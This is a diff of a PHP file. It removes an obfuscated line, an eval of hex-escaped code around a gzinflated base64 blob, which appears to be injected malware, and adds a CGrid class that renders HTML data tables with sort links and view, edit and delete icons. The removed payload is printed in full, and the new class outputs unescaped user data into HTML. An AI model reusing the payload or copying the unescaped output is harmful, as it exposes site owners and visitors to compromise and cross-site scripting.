@@ -1,3 +1,224 @@
 <?php
-eval("\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28'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'\x29\x29\x29\x3B");
+class CGrid extends CGDL {
+    public $operations;
+    public $headers;
+    public $sort;
+    public $noSort;
+    public $css = 'clist';
+    public $operationCss = 'operationCss';
+    public $counter = FALSE;
+    public $counterWidth = '5%';
+    const NOTFOUND = '<div class="red">  </div>';
+    private $method;
+    public function __construct($method = '') {
+        $this->method = $method;
+    }
+    public function run() {
+        if ($this->operations !== FALSE) {
+            if (!is_array($this->operations)) $this->operations = array();
+            if (!isset($this->operations['view'])) {
+                $this->operations['view'] = array('icon' => 'public/images/view.png');
+            }
+            if (!isset($this->operations['edit'])) {
+                $this->operations['edit'] = array('icon' => 'public/images/edit.png');
+            }
+            if (!isset($this->operations['delete'])) {
+                $this->operations['delete'] = array('icon' => 'public/images/delete.png');
+            }
+        }
+        if (!isset($this->values)) {
+            if ($this->paginate == TRUE) $pResult = $this->paginate();
+            $this->values = $this->getValue();
+        } else {
+            $sortField = $this->getSort();
+            if ($sortField !== FALSE) {
+                $desc = FALSE;
+                if (strpos($sortField, 'DESC') !== FALSE) {
+                    $sortField = substr($sortField, 0, -5); // ' DESC'
+                    $desc = TRUE;
+                }
+                $this->values = $this->valueSort($sortField, $desc);
+            }
+            if ($this->paginate == TRUE) {
+                $count = count($this->values);
+                $pResult = $this->paginate($count);
+            }
+        }
+        if (empty($this->values)) {
+            return self::NOTFOUND;
+        }
+        $output = '<table class="' . $this->css . '">';
+        $output.= $this->makeCols();
+        if ($this->counter) {
+            $page = 1;
+            if (!empty($_GET['page'])) {
+                $page = $_GET['page'];
+            }
+            $rowCounter = ($page - 1) * $this->pageSize + 1;
+        }
+        $i = 0;
+        foreach ($this->values as $row) {
+            $this->value = $row;
+            $class = (($i % 2) == 0) ? 'even' : 'odd';
+            $output.= '<tr class="' . $class . '">';
+            if ($this->counter) {
+                $output.= "<td>$rowCounter</td>";
+                $rowCounter++;
+            }
+            foreach ($this->headers as $key => $field) {
+                if (is_string($key)) {
+                    $data = $row->$key;
+                    if (is_array($field)) {
+                        if (isset($field['onEmpty']) && empty($data)) {
+                            $data = $field['onEmpty'];
+                        } elseif (!empty($field['format'])) //field[0] is format
+                        {
+                            if (is_array($field['format'])) {
+                                foreach ($field['format'] as $format) $data = $this->setDisplay($data, $format);
+                            } else $data = $this->setDisplay($data, $field['format']);
+                        }
+                    }
+                } else {
+                    $data = $row->$field;
+                }
+                $output.= '<td>' . $data . '</td>';
+            }
+            $db = new CDatabase;
+            if (!empty($this->table)) $db->setTbl($this->table);
+            if (empty($this->pk)) $this->pk = $db->pkName();
+            if ($this->operations != FALSE) {
+                $output.= '<td';
+                if (!empty($this->operationCss)) $output.= ' class="' . $this->operationCss . '"';
+                $output.= '>';
+                $output.= $this->generateOperations();
+                $output.= '</td>';
+            }
+            $output.= '</tr>';
+            $i++;
+        }
+        $output.= '</table>';
+        if (isset($pResult)) $output.= $pResult;
+        unset($this->values);
+        return $output;
+    }
+    private function generateOperations() {
+        if (empty($this->pk)) return;
+        if (is_array($this->operations)) {
+            $output = '';
+            foreach ($this->operations as $operation => $data) {
+                //if $operation has $value->sth
+                $operation = $this->getReal($operation);
+                if (!is_array($data)) {
+                    continue;
+                }
+                if (isset($data['visible'])) {
+                    $condition = $data['visible'];
+                    $condition = str_replace('$value', $this->value->{$this->pk}, $condition);
+                    $condition = $this->evaluate($condition);
+                    if ($condition !== TRUE) {
+                        continue;
+                    }
+                }
+                $firstSlashPos = strpos($operation, '/');
+                if ($firstSlashPos !== FALSE) {
+                    if (($secondSlashPos = strpos($operation, '/', $firstSlashPos + 1)) !== FALSE) {
+                        $method = substr($operation, $firstSlashPos + 1, $secondSlashPos - $firstSlashPos - 1);
+                    } else {
+                        $method = substr($operation, $firstSlashPos + 1);
+                        $operation.= '/' . $this->value->{$this->pk};
+                    }
+                } else {
+                    $method = $operation;
+                    $operation = CUrl::segment(1) . '/' . $operation;
+                    $operation.= '/' . $this->value->{$this->pk};
+                }
+                $urlFlag = TRUE;
+                if (isset($data['noLink']) && $data['noLink'] == TRUE) $urlFlag = FALSE;
+                if ($urlFlag) {
+                    $url = CUrl::createUrl($operation);
+                    $output.= '<a href="' . $url . '"';
+                    if (!empty($data['title'])) {
+                        $output.= ' title="' . $data['title'] . '"';
+                    }
+                    if (stripos($method, 'delete') !== FALSE) {
+                        $output.= ' onclick="return confirm(\'   \')"';
+                    }
+                    if (!empty($data['in'])) $output.= " $data[in]";
+                    $output.= '>';
+                }
+                if (!empty($data['icon'])) {
+                    $data['icon'] = trim($data['icon'], '/');
+                    $img = PHP40::get()->homeUrl . $data['icon'];
+                    $output.= '<img src="' . $img . '"';
+                    if (!empty($data['alt'])) {
+                        $output.= ' alt="' . $data['alt'] . '"';
+                    } else {
+                        $output.= ' alt="' . $method . '"';
+                    }
+                    $output.= ' style="border:0px" />';
+                } elseif (!empty($data['label'])) {
+                    $output.= ' ' . $data['label'] . ' ';
+                } else {
+                    $output.= ' ' . $method . ' ';
+                }
+                if ($urlFlag) $output.= '</a>';
+            }
+            return $output;
+        }
+    }
+    private function makeCols() {
+        $label = new CLabel($this->method);
+        $route = CGeneral::makeUrlQuery('sort');
+        $sortType = '';
+        $output = '<tr>';
+        if (!empty($_GET['sort'])) {
+            $dotPos = strrpos($_GET['sort'], '.');
+            if ($dotPos !== FALSE) {
+                $sortType = (substr($_GET['sort'], $dotPos + 1) == 'desc') ? '' : 'desc';
+            } else {
+                $sortType = 'desc';
+            }
+        }
+        if ($this->counter) {
+            $output.= '<th class="grid_th"  width="' . $this->counterWidth . '" scope="col"></th>';
+        }
+        foreach ($this->headers as $key => $field) {
+            $output.= '<th class="grid_th" scope="col">';
+            if (is_string($key)) //user has set the value e.g. header=array('field_in_tbl'=>'label') or header=array('field_in_tbl'=>array('format','label')
+            {
+                if (is_array($field)) {
+                    //label is already set
+                    if (!empty($field['label'])) {
+                        $tempLbl = $field['label'];
+                    } else {
+                        $tempLbl = $label->getLabel($key);
+                    }
+                }
+                if ((is_array($this->noSort) && (array_search($key, $this->noSort) !== FALSE)) || ($this->noSort === TRUE)) {
+                    $output.= $tempLbl;
+                } else {
+                    $output.= '<a href="' . $route . $key;
+                    if (!empty($sortType)) $output.= '.' . $sortType;
+                    $output.= '">' . $tempLbl . '</a>';
+                }
+            } else {
+                if ((is_array($this->noSort) && (array_search($key, $this->noSort) !== FALSE)) || ($this->noSort === TRUE)) {
+                    $output.= $label->getLabel($field);
+                } else {
+                    $output.= '<a href="' . $route . $field;
+                    if (!empty($sortType)) $output.= '.' . $sortType;
+                    $output.= '">' . $label->getLabel($field) . '</a>';
+                }
+            }
+            $output.= '</th>';
+        }
+        if (is_array($this->operations)) {
+            $output.= '<th  class="grid_th" scope="col" ';
+            if (!empty($this->operationCss)) $output.= $this->operationCss;
+            $output.= '"></th>';
+        }
+        $output.= '</tr>';
+        return $output;
+    }
+}
 ?>
